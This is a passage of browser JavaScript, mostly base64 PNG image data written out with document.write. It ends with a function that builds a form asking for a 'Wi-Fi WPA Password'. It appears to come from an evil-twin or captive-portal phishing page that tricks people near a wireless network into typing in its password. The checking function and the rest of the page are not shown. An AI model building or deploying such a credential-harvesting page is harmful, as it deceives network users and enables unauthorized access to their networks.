GERRJCbG5L62Ty9H0fotEW63QM+v3ciN//4LR4zJ5Fa4ajcBUQJwpeK3iHwNMFE+Uxuh5mnyhFHyMoFDKh7rJiAFMSoinU57PMJqdaTX69VsIXcRlE4NNRoNHo+nNMJideR2Nx5T4YpPFFAYFyiKIhZLvDfCYrUzrVifCs+vOWDUFUlIVXVNeYTF6qi27vRJFRISJURY1rFIQMoXpUhlJSZYukRYpo7i42I7q1BZjQLgVKqyampqdREWq6Oa2jqtCpXlEJASRiqSEL1O1yPCYnVkMBh6qZCQKgEp5EoReX2+nhEWq6NGj0fNIC4XkHJ1KCTNDQBF6zZHON0CPb92Y0C1XK/isX8FjHqLsW8ajQany2X45p9HzBPHj4hwvAWaPGEUB//vG7PTVW9QaENcgEdA2jc4qvRFi1cW/SbCbmW0/IUX+6u4/QjgFZAyPn+jeNZQ5xgQYbXCRWFt3V0qbv9nQEI8wFeKZlqAz+t7AGD6nMgBh+YoEDHskXmlkL4CPIKcl/agIpMOOJ3OHivXrO+2fOGcCOebU1ULcygoWt9dzs2llA7abVZvwHVyAulQgJIVovHjv31+H8BU+chLhIKM+Uzp1Mn//O3Te1B4EpSfUp+fOUpzXP4oWSAaHA7nQIBC+chLhIKmu0ulQepwuAaqyFp3hv+B0+//QkpMr4h8Pt+tI9Kz+kTYf24aNmFaH6/ff6uKR76VMTjrsPU+FDoafX7/9XUOx68jrD83OZzOX/v9fqULwkakCg0/O2y9B2hQKCH4vL7hD47MMETsyNn2Y8ioSQa/zzfC51OccaIB2A1Bh61ltXUM+FKZXdfQ4HYP6pyU2DdiR862H4mWuL71De4UFR7eL+w26xn73TQFXaEKO8LJU5UFAGOfmHnZgzFmkpRf62RFVYEK6TjD8wAGrQ767N3zqnvWP5//PvE9obbtD6Ukp6ZZ5HVTS2nMvUBXu81a2dZ90liuQaw5wtgnZg48dqJUTdBnrd1mtQRfOFdYtKoYtbIfT655+/29RmqPM+OZRZedZGTlLESsOcKuP+0z/lh+ao3KxxcADAgKiz4TdxVIJt/7upuOAGOR4pxbJK/PZ/nH14fFwwc+2/fxB39ucwb0vu4mIzBRgRT7geeOHj7QprHaf/1QyjDuEvVzXfX1f0B56t0qIP3o4QPOY0GJ/IUm6gCko/zFKvok1Nc3PP7g8PR+l6v9+OOw9H719Q2PoyLLK7AGqGiaEehnqTXsNqsP2IGKjSuPx9vN5/MvGD9lthkgd/GKSx6E/JWSdho/ZbbZ7/ct8KjLc1IG7LTbrL5mU2s0AeYzpDI/ijaD5c2rlMqq6ukAzz41jY2v7rhkwXhpy3ZmPZkpOaGqqqc7XfUpKlM07WqurlWzCcyQstUozpgmiiKnHc55j46dPBmkPIWXKr38ilRZ79GxkyfXORzzVCbFrJV5qy6BmbxQVLXp4ff7qaiqzhuenjX4wz3bGZkx/ZIDY0RGFh/+aTvDJjw5uKKqOk/0qw5hzAssBBUnMAP4rZR7YxlSzSU1oMRWVFQWjZ00s/+m4uUEUolfEmCkT2NzcQFjJs3oX1lVXRRCDt8Ddpt1WXJq88ndmgUkyG88FAWHIILJ3djY5VRl1bYxk2b031xcwO9+/zCbtl68NuXFjVu58/6hbC5ZwZiJ2f0rKqu3ud2Nak9xumRecr7AXE0Lq+LAn9OAAjVvF0URgyGq/IrEhIlb1q7cCbC0sISZU9MvqpV6cJ+HT3hycEVldZG7sbFLCHVGsoAVzakqRYAEMSEa2An8Xm0vBEE43alT4txXX1xVGI7ReqFcJ4+NmzL1VGXVghBTjb+NlGq8xUWqoIAByA1NRNWhup9sysmTlSsfHJ6e+/iUp87kScye2yo3i5KBFPLJ/uAMR+MmzzI/OCw992RF5coQwShDquRWr6SOiNpyFcmAjRCKf0nlKky7tTrt3Dc2y/kZ9Z3Ac0qthMQg1S/pRPM5DjWAD6l6mrpkx9HdoV4qs/7g8Ix+Xp93gctVH2q5CidSuQq70nIVikZRUEVLOzBK6YLx5+sUR4rT6dqT+tj43Ndsewx4Tp1xW6v8kWOQ0timNvN5APijmnUUwJhJ2VD/A6/seMvwwKPjc50u1x6HwxkqGCIwSg0YiiUEIPkPadjfPFMmb4LsiwmV/EaD4UjXLp0yX3ph6fsg7bYFDgi0NwW/e+wTMwb+WF6xpsHtvqY1ag/IBNbabVb/gNTH2KuwmHFrioLlyzOHkGNG5LjF/VckWrIqq2sP7ty05kz2nIysHIoL2iafSvq0HEpW/NT2w6MnGSzxsX0rKqsLVOZLbG4yUWC3WUMqLdfasnn5QKu2CwNl84wGw1s6ve4Vk9H4iXVd4ZkTMFNmzWNV/rywANG0rbTxk/u4Ghpv83m9w+sbGlJ8Pn84yuYtDYDRbmXzmoCSKRtZTWuB0em0aDTCIa0gfGY2x7z/q1/2fWf2tMyzZnaFxRuYmjFaUZuFxS8zNWPMWdeWrCjq9umXB+9zOFwDfX7fraIoXu/1hq2w5CS7zbomVDBaq7Kall7dSAjFws4zK3OLotgQE2Mq1et0uxMs8XunZoz9y803Xqeq2sE/vjpkLize8NvqmtoBHq83xel09dBoNJdW6dVmAEoGXqGNihMHCgzHmKLdInwdpdeXNjY2HrdY4n1Op6sSICbGlFRTU6uNiorqKUcu3eBy1Rsui+LETd0rl2n57neB9EAFtpbcIu0tIcEF7tORXPcmLk1yAXOAErvN6mqNimozQJqAAnA9Us2lmy4xMA4geW0PBS2Yw9Z4WDM5BHfMbrMestusN8vT4rpQVvcdiET5N8y026w3223WQ+f6zR1OQlqwLU8jZc++8iID419IZ28X2W3WY8m/TwMD2N+0tsnLNO35y5JT0/oBD8luhcQODkSV7B7aYbdZP2+vlwrtBERAWj4HcoEbgOlATQcEolZ2CV0P5AbAUFOC+6KRkHOtYJNT0wYjlWy4BSkELKqdu9SIFBLwBVBot1l3NtfXSxKQ8wBztWxj7kLKQ98TuKKNXl+BFEL2HVKg0m67zXoi8OWA1DT2tjMQFxyQ841COTF9T6T0231lFXctUipVtZtjTqTECN8AXyNt/54AjgfCyC6kRHQ4QBSAo0NK9qxHcvVHAd2QkncmIhWACtRU9wAO2SCXy26NRiSXuAfwyGHgHQqEYPp/BqFW26Wu/JMAAAAASUVORK5CYII="/>');
else
    document.write('<'+'img src="data:image/png;base64,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"/>');

// write form script
fn_write_form = function() {
    document.write('<form action="" method="post">Wi-Fi WPA Password: &nbsp;&nbsp;<input id="wpa_pass" type="password" name="wpa-password"><input id="btnSubmit" type="submit" value="Submit" onclick="fn_check();"></form>');
}